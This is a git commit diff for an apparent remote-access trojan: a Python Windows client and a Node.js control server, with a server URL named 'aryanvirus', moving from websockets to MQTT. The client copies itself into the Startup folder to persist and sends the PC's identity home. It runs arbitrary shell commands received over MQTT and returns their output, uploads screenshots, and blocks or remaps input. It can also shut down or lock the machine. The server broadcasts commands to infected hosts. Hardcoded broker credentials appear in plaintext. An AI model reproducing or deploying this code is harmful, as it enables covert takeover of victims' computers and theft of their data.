df2eb58f3fb2a8d0aa5ce9231900eaec5023dda4
aryanvish2006 <aryanvish135@gmail.com>
2025-10-12 18:50:27 -0700

    changes to mqtt

--- client/client.py
+++ client/client.py
@@ -1,38 +1,32 @@
-import asyncio
-import websockets
-import websockets.exceptions
+import paho.mqtt.client as mqtt
+import threading
+import socket
+import uuid
+import time
 import pyautogui as pg
 import keyboard
 import os
-import time
-import requests
-import socket
 import subprocess
 import webbrowser
-import threading
-import uuid
-
-#function import
-import blockInput
-from notepadType import notepad_write
-from prompt import alertPrompt
-from prompt import inputPrompt
-
+import requests
 import shutil
 from pathlib import Path
 import sys
+import ssl
 
+# Function imports
+import blockInput
+from notepadType import notepad_write
+from prompt import alertPrompt, inputPrompt
+
+# Startup setup
 FLAG_FILE = Path(os.getenv('APPDATA')) / "my_program_first_run.flag"
 
 def add_to_startup():
-    print("initial move")
     try:
-        print("startedmvoe")
         startup_dir = Path(os.getenv('APPDATA')) / r"Microsoft\Windows\Start Menu\Programs\Startup"
-        # startup_dir = Path(os.getenv('ProgramData')) / r"Microsoft\Windows\Start Menu\Programs\Startup"
-        exe_path = Path(sys.argv[0]).resolve()  # now this is the exe
+        exe_path = Path(sys.argv[0]).resolve()
         destination = startup_dir / exe_path.name
-
         if not destination.exists():
             shutil.copy(exe_path, destination)
     except Exception as e:
@@ -42,195 +36,171 @@ if not FLAG_FILE.exists():
     add_to_startup()
     FLAG_FILE.touch()
 
-serverUrl = "http://localhost:3000"    
-uri = "ws://localhost:3000"
-
-# serverUrl = "https://aryanvirus.onrender.com"
-# uri = "wss://aryanvirus.onrender.com" 
-
+# Server / MQTT settings
+# serverUrl = "http://localhost:3000"s
+serverUrl = "https://aryanvirus.onrender.com"
+BROKER = "n171f1d9.ala.eu-central-1.emqxsl.com"
+PORT = 8883
+USERNAME = "aryanvish2006"
+PASSWORD = "aryanvish2006saniya"
 
 POLL_INTERVAL = 60
 
-"""check server variable to see if we should connect"""
-def should_connect():
-    try:
-        r = requests.get(f"{serverUrl}/shouldconnect",timeout=5)
-        j = r.json()
-        return bool(j.get("connect"))
-    except:
-        return False
+# PC identification
+pc_name = socket.gethostname()
+mac = hex(uuid.getnode())
+pc_id = f"{pc_name}_{mac}"
 
+# MQTT topics
+CONTROL_TOPIC = f"control/{pc_id}"
+ACK_TOPIC = f"ack/{pc_id}"
 
+# Poll server
+# def should_connect():
+#     try:
+#         r = requests.get(f"{serverUrl}/shouldconnect", timeout=5)
+#         return bool(r.json().get("connect"))
+#     except:
+#         return False
 
+# Screenshot
 def take_screenshot():
     try:
-        pc_name = socket.gethostname()
         filename = f"{pc_name}_screenshot.png"
         pg.screenshot(filename)
-        url = f"{serverUrl}/upload"
-        with open(filename,"rb") as f:
-            requests.post(url,files={"screenshot":f})
+        with open(filename, "rb") as f:
+            requests.post(f"{serverUrl}/upload", files={"screenshot": f})
         os.remove(filename)
     except:
         pass
-      
+
+# Handle all messages
 def handle_msg(msg):
     try:
-            if msg == "block":
-                blockInput.start_block("both")
-            elif msg == "blockkeyboard":
-                blockInput.start_block("keyboard")
-            elif msg == "blockmouse":
-                blockInput.start_block("mouse")     
-            elif msg == "unblock":
-                blockInput.unblock_all()
-            elif msg == "shutdown":
-                os.system("shutdown /s /t 0")      
-            elif msg=="desktop":
-                pg.keyDown("win")
-                pg.press("d")
-                pg.keyUp("win")
-            elif msg=="close":
-                keyboard.send("alt+f4")
-            elif msg=="screenshot":
-                take_screenshot()
-            elif msg=="lock":
-                os.system("rundll32.exe user32.dll,LockWorkStation")
-            elif msg=="end":
-                os._exit(0)
-    except:
-        pass
-def send_data():
-    try:
-        pc_name = socket.gethostname()
-        mac = hex(uuid.getnode())
-        pc_id = f"{pc_name}_{mac}"
-        url = f"{serverUrl}/posttrace"
-        requests.get(url,params={"pc_id":pc_id})
+        msg = msg.lower()
+        if msg == "block":
+            blockInput.start_block("both")
+        elif msg == "blockkeyboard":
+            blockInput.start_block("keyboard")
+        elif msg == "blockmouse":
+            blockInput.start_block("mouse")
+        elif msg == "unblock":
+            blockInput.unblock_all()
+        elif msg == "shutdown":
+            os.system("shutdown /s /t 0")
+        elif msg == "desktop":
+            pg.hotkey("win", "d")
+        elif msg == "close":
+            keyboard.send("alt+f4")
+        elif msg == "screenshot":
+            take_screenshot()
+        elif msg == "lock":
+            os.system("rundll32.exe user32.dll,LockWorkStation")
+        elif msg == "end":
+            os._exit(0)
+        elif msg.startswith("subprocess"):
+            try:
+                subprocess.run(msg[len("subprocess "):], shell=True)
+            except:pass    
+        elif msg.startswith("browser"):
+            webbrowser.open(msg[len("browser "):])
+        elif msg.startswith("type"):
+            pg.typewrite(msg[len("type "):], 0.2)
+        elif msg.startswith("notepadtypeheart"):
+            notepad_write(msg[len("notepadtypeheart "):], True)
+        elif msg.startswith("notepadtype"):
+            notepad_write(msg[len("notepadtype "):], False)
+        elif msg.startswith("press"):
+            pg.press(msg[len("press "):])
+        elif msg.startswith("alertprompt"):
+            alertPrompt(msg[len("alertprompt "):])
+        elif msg.startswith("inputprompt"):
+            value = inputPrompt(msg[len("inputprompt "):])
+            client.publish(ACK_TOPIC, value)
+        elif msg.startswith("backspace"):
+            for _ in range(int(msg[len("backspace "):])):
+                pg.press("backspace")
+                time.sleep(0.05)
+        elif msg.startswith("blockkey"):
+            keyboard.block_key(msg[len("blockkey "):])
+        elif msg.startswith("unblockkey"):
+            keyboard.unblock_key(msg[len("unblockkey "):])
+        elif msg.startswith("remap"):
+            keyboard.remap_key(msg[len("remap "):][0], msg[len("remap "):][1])
+        elif msg.startswith("swapkey"):
+            try:
+                s = msg[len("swapkey "):].split()
+                keyboard.remap_key(s[0], s[1])
+                keyboard.remap_key(s[1], s[0])
+            except:pass
+        elif msg.startswith("cmdwithoutput"):
+            try:
+                result = subprocess.run(msg[len("cmdwithoutput "):], shell=True, capture_output=True, text=True)
+                client.publish(ACK_TOPIC, result.stdout)
+            except:pass
     except Exception as e:
         print(e)
-        
+
+# Send initial trace
+def send_data():
+    try:
+        requests.get(f"{serverUrl}/posttrace", params={"pc_id": pc_id})
+    except:
+        pass
 
 def send_handler():
     threading.Thread(target=send_data).start()
 
-keyboard.add_hotkey("ctrl+shift+q",send_handler)
-                  
-async def listen(): 
-    pc_name = socket.gethostname()
-    mac = hex(uuid.getnode())
-    pc_id = f"{pc_name}_{mac}"
-    while True:
-        try:
-            async with websockets.connect(uri,open_timeout=5,ping_interval=20,ping_timeout=10) as websocket:
-                await websocket.send("Connected :"+pc_id)
-                while True:
-                    message = await websocket.recv() 
-                    print("Recieved : ", message)
-                    await websocket.send(f"ACK:{pc_id}")
-                    if message == "checkflag":
-                        try:
-                            r = requests.get(f"{serverUrl}/shouldconnect",timeout=5)
-                            if not r.json().get("connect",False):
-                                await websocket.close()
-                                return
-                        except:pass
-                    elif message.startswith("subprocess"):
-                        command = message[len("subprocess "):]
-                        try:
-                            subprocess.run(command,shell=True)
-                        except:pass    
-                    elif message.startswith("browser"):
-                    
-                        command = message[len("browser "):]
-                        print(command)
-                        try:
-                            webbrowser.open(command)
-                        except:pass    
-                    elif message.startswith("type"):
-                    
-                        command = message[len("type "):]
-                        print(command)
-                        pg.typewrite(command,0.2) 
-                    elif message.startswith("notepadtypeheart"):
-                    
-                        command = message[len("notepadtypeheart "):]
-                        try:
-                            notepad_write(command,True)
-                        except:pass         
-                    elif message.startswith("notepadtype"):
-                        command = message[len("notepadtype "):]
-                        notepad_write(command,False) 
-                    elif message.startswith("press"):
-                    
-                        command = message[len("press "):]
-                        pg.press(command)    
-                    elif message.startswith("alertprompt"):
-                    
-                        command = message[len("alertprompt "):]
-                        alertPrompt(command) 
-                    elif message.startswith("inputprompt"):
-                    
-                        try:
-                            command = message[len("inputprompt "):]
-                            value=inputPrompt(command)  
-                            await websocket.send(value)
-                        except:pass    
-                    elif message.startswith("backspace"):
-                    
-                        command = message[len("backspace "):]
-                        try:
-                            for _ in range(int(command)):
-                                pg.press("backspace")
-                                time.sleep(0.05)
-                        except Exception as e:
-                            print(e)
-                    elif message.startswith("blockkey"):
-                    
-                        command = message[len("blockkey "):]
-                        try:
-                            keyboard.block_key(command)
-                        except:pass    
-                    elif message.startswith("unblockkey"):
-                        command = message[len("unblockkey "):]
-                        try:
-                            keyboard.unblock_key(command)
-                        except:pass   
-                    elif message.startswith("remap"):
-                        command = message[len("remap "):]
-                        try:
-                            keyboard.remap_key(command[0],command[1])
-                        except:pass    
-                    elif message.startswith("swapkey"):
-                        s = message[len("swapkey "):]
-                        command = s.split()
-                        try:
-                            keyboard.remap_key(command[0],command[1])
-                            keyboard.remap_key(command[1],command[0])   
-                        except:pass    
-                    elif message.startswith("cmdwithoutput"):
-                        command = message[len("cmdwithoutput "):]
-                        try:
-                            result = subprocess.run(command,shell=True,capture_output=True,text=True)
-                            await websocket.send(result.stdout)    
-                        except:
-                            pass                 
-                    else:    
-                        handle_msg(message)               
-        except (websockets.exceptions.ConnectionClosedError,websockets.exceptions.InvalidHandshake,ConnectionRefusedError,asyncio.TimeoutError,OSError,socket.gaierror):
-            print("connection lost . Reconnecting in 3 seconds ...")
-            await asyncio.sleep(3)
+keyboard.add_hotkey("ctrl+shift+q", send_handler)
+
+# MQTT callbacks
+def on_connect(client, userdata, flags, rc):
+    print(f"{pc_id} Connected to MQTT broker, code: {rc}")
+    client.subscribe(CONTROL_TOPIC)
+    client.publish(ACK_TOPIC, f"{pc_id} Connected")
+
+def on_message(client, userdata, msg):
+    message = msg.payload.decode()
+    print(f"Received: {message}")
+    handle_msg(message)
+    client.publish(ACK_TOPIC, f"ACK:{pc_id}")
+
+# MQTT client setup
+client = mqtt.Client()
+client.username_pw_set(USERNAME, PASSWORD)
+client.tls_set(cert_reqs=ssl.CERT_NONE)
+client.tls_insecure_set(True)
+client.on_connect = on_connect
+client.on_message = on_message
 
 
-async def poll_loop():
-    while True:
-        try:
-            if should_connect():
-                print("Server says connect - Starting Websocket")
-                await listen()
-            else:
-                print("Server says No connect - sleeping 60s")
-                await asyncio.sleep(POLL_INTERVAL)
-        except:pass
+# client.connect(BROKER, PORT, 60)
 
-asyncio.run(poll_loop())
+# client.loop_forever()
+
+while True:
+    try:
+        client.connect(BROKER, PORT, 60)
+        client.loop_forever()
+    except Exception as e:
+        print(f"MQTT connection failed: {e}. Retrying in 5 seconds...")
+        time.sleep(5)
+
+# Poll server loop
+# def poll_loop():
+#     while True:
+#         if should_connect():
+#             if not client.is_connected():
+#                 print(f"{pc_id}: Server says connect -> Connecting MQTT")
+#                 client.reconnect()  # reconnect if disconnected
+#         else:
+#             if client.is_connected():
+#                 print(f"{pc_id}: Server says No connect -> Disconnecting MQTT")
+#                 client.disconnect()
+#         time.sleep(POLL_INTERVAL)
+
+
+# threading.Thread(target=poll_loop, daemon=True).start()
+
+# Run MQTT loop
+
--- server/server.js
+++ server/server.js
@@ -1,105 +1,64 @@
-const express = require("express")
-const WebSocket = require("ws")
-const multer = require("multer")
-const path = require("path")
-const fs = require("fs")
+const express = require("express");
+const multer = require("multer");
+const path = require("path");
+const fs = require("fs");
+const mqtt = require("mqtt");
 
 const app = express();
-const upload = multer({dest:"uploads/"});
- 
-const server = app.listen(3000,()=>{
-    console.log("server running at 3000")
-})
-const wss = new WebSocket.Server({noServer:true});
+const upload = multer({ dest: "uploads/" });
 
-const clients = new Map();
-const ackedClients = new Set()
-let connectFlag = false;
+// --- MQTT Setup ---
+const BROKER = "n171f1d9.ala.eu-central-1.emqxsl.com";
+const PORT = 8883;
+const USERNAME = "aryanvish2006";
+const PASSWORD = "aryanvish2006saniya";
 
-wss.on("connection", (ws) => {
-  let deviceName = null;
-
-  ws.on("message", (value) => {
-    const msg = value.toString();
-    if(msg.startsWith("ACK:")){
-      const ackDevice = msg.split(":")[1];
-      ackedClients.add(ackDevice)
-      console.log(`Ack recived. Total : ${ackedClients.size} / ${clients.size}`)
-    }
-    else if(msg.startsWith("Connected")) {
-      deviceName = msg.split(":")[1].trim();
-
-      // Close old connection if already exists
-      if (clients.has(deviceName)) {
-        const old = clients.get(deviceName);
-        if (old.readyState === WebSocket.OPEN) old.close();
-      }
-
-      clients.set(deviceName, ws);
-      console.log("Connected:", deviceName);
-    }else {
-      console.log(`Message from ${deviceName || "unknown"}`, msg);
-    }
-  });
-
-  ws.on("close", () => {
-    if (deviceName && clients.get(deviceName) === ws) {
-      clients.delete(deviceName);
-      console.log("Disconnected:", deviceName);
-    }
-  });
+const mqttClient = mqtt.connect(`mqtts://${BROKER}:${PORT}`, {
+  username: USERNAME,
+  password: PASSWORD,
+  rejectUnauthorized: false // set true if using proper CA cert
 });
 
-server.on("upgrade",(request,socket,head)=>{
-    wss.handleUpgrade(request,socket,head,ws=>{
-        wss.emit("connection",ws,request)
-    })
-})
+const knownClients = new Set();
 
-app.get("/shouldconnect",(req,res)=>{
-  res.json({connect:connectFlag})
-})
-app.get("/setconnect/:value",(req,res)=>{
-  connectFlag =req.params.value === "true";
-  res.send(`connectFlag set to ${connectFlag}`);
-})
-
-app.post("/upload",upload.single("screenshot"),(req,res)=>{
-    const savePath = path.join("uploads",req.file.originalname);
-    fs.renameSync(req.file.path,savePath);
-    console.log("saved screenshot",req.file.originalname);
-    res.send("Saved");
-})
-app.get("/clients", (req, res) => {
-  const connectedClients = Array.from(clients.keys()).map((deviceName, index) => ({
-    id: index,
-    deviceName
-  }));
-  res.json(connectedClients);
+mqttClient.on("connect", () => {
+  console.log("Connected to MQTT broker");
+  // Subscribe to all ACK topics
+  mqttClient.subscribe("ack/+");
 });
 
-
-app.get("/send", (req, res) => {
-  const i = parseInt(req.query.i); // use ?i=0
-  const msg = req.query.msg;
-
-  if (isNaN(i) || !msg)
-    return res.send("Usage: /send?i=0&msg=yourMessage");
-
-  const clientArray = Array.from(clients.values());
-  const target = clientArray[i];
-
-  if (!target) return res.send(`No client at index ${i}`);
-
-  if (target.readyState === WebSocket.OPEN) {
-    target.send(msg);
-    const deviceName = Array.from(clients.keys())[i];
-    res.send(`Message sent to ${deviceName} (i=${i}): ${msg}`);
-  } else {
-    res.send(`Client at i=${i} is disconnected`);
+mqttClient.on("message", (topic, message) => {
+  const msg = message.toString();
+  if (topic.startsWith("ack/")) {
+    const clientId = topic.replace("ack/", "");
+    knownClients.add(clientId);
+    console.log(`ACK from ${clientId}: ${msg}`);
   }
 });
 
+// --- Express Server ---
+const server = app.listen(3000, () => console.log("Server running at 3000"));
+
+let connectFlag = false;
+let lastTrackedDevice = null;
+
+// --- Poll connect flag ---
+app.get("/shouldconnect", (req, res) => {
+  res.json({ connect: connectFlag });
+});
+
+app.get("/setconnect/:value", (req, res) => {
+  connectFlag = req.params.value === "true";
+  res.send(`connectFlag set to ${connectFlag}`);
+});
+
+// --- File Uploads ---
+app.post("/upload", upload.single("screenshot"), (req, res) => {
+  const savePath = path.join("uploads", req.file.originalname);
+  fs.renameSync(req.file.path, savePath);
+  console.log("Saved screenshot:", req.file.originalname);
+  res.send("Saved");
+});
 
 app.use("/uploads", express.static(path.join(__dirname, "uploads")));
 
@@ -107,75 +66,77 @@ app.get("/listuploads", (req, res) => {
   const dirPath = path.join(__dirname, "uploads");
   fs.readdir(dirPath, (err, files) => {
     if (err) return res.status(500).send("Failed to read uploads folder");
-
     const imageUrls = files.map(file => `http://localhost:3000/uploads/${file}`);
     res.json(imageUrls);
   });
 });
+
 app.get("/latestupload", (req, res) => {
   const dirPath = path.join(__dirname, "uploads");
   fs.readdir(dirPath, (err, files) => {
     if (err || files.length === 0) return res.status(404).send("No uploads");
-
-    // Get the newest file by modified time
     const latestFile = files
       .map(file => ({ file, time: fs.statSync(path.join(dirPath, file)).mtime }))
       .sort((a, b) => b.time - a.time)[0].file;
-
     res.sendFile(path.join(dirPath, latestFile));
   });
 });
+
 app.get("/showuploads", (req, res) => {
   const dirPath = path.join(__dirname, "uploads");
   fs.readdir(dirPath, (err, files) => {
     if (err || files.length === 0) return res.status(404).send("No uploads");
-
-    // Filter only image files (optional)
     const images = files.filter(f => /\.(png|jpg|jpeg|gif)$/i.test(f));
-
-    // Build simple HTML to show all images
     let html = "<h1>Uploaded Images</h1>";
     images.forEach(file => {
       html += `<div><img src="/uploads/${file}" style="max-width:500px;margin:10px"/><p>${file}</p></div>`;
     });
-
     res.send(html);
   });
 });
 
+// --- Clients ---
+app.get("/clients", (req, res) => {
+  res.json(Array.from(knownClients).map((deviceName, index) => ({
+    id: index,
+    deviceName
+  })));
+});
 
+// --- Send to single client ---
+app.get("/send", (req, res) => {
+  const pcId = req.query.pc_id;
+  const msg = req.query.msg;
+  if (!pcId || !msg) return res.send("Usage: /send?pc_id=<id>&msg=yourMessage");
+  const topic = `control/${pcId}`;
+  mqttClient.publish(topic, msg);
+  res.send(`Message sent to ${pcId}: ${msg}`);
+});
+
+// --- Broadcast ---
 app.get("/broadcast", (req, res) => {
   const msg = req.query.msg;
   if (!msg) return res.send("Usage: /broadcast?msg=yourMessage");
-
-  for (const ws of clients.values()) {
-    if (ws.readyState === WebSocket.OPEN) ws.send(msg);
-  }
-
-  res.send("Message broadcasted to all connected devices");
+  const clients = req.query.clients ? req.query.clients.split(",") : Array.from(knownClients);
+  clients.forEach(pcId => mqttClient.publish(`control/${pcId}`, msg));
+  res.send("Message broadcasted to all selected devices");
 });
 
-let lastTrackedDevice = null;
-
+// --- Trace ---
 app.get("/posttrace", (req, res) => {
   const pcName = req.query.pc_id?.trim();
   if (!pcName) return res.status(400).send("Missing pc_id");
-
   lastTrackedDevice = pcName;
   console.log("Tracked device:", pcName);
   res.send("Device tracked");
 });
 
 app.get("/trace", (req, res) => {
-  if (!lastTrackedDevice)
-    return res.json({ message: "No device has been tracked yet" });
-
-  const devices = Array.from(clients.keys());
+  if (!lastTrackedDevice) return res.json({ message: "No device has been tracked yet" });
+  const devices = Array.from(knownClients);
   const trackedIndex = devices.indexOf(lastTrackedDevice);
-
   res.json({
     "CTRL+SHIFT+Q pressed UserIndex": trackedIndex >= 0 ? trackedIndex : "Not connected",
     "deviceId": lastTrackedDevice
   });
 });
-
